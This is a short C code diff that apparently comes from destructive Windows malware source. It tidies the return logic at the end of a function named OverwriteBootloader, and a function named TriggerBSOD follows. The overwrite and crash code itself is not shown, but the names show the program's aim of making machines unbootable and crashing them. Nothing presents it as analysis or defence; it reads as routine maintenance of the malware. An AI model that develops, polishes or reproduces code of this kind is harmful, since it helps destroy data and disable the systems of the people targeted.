@@ -71,11 +71,7 @@ BOOL OverwriteBootloader() {
         return FALSE;
     }
 
-    if (!CloseHandle(drive) || !CloseHandle(bootloader)) {
-        return FALSE;
-    } else {
-        return TRUE;
-    }
+    return CloseHandle(drive) && CloseHandle(bootloader);
 }
 
 void TriggerBSOD() {
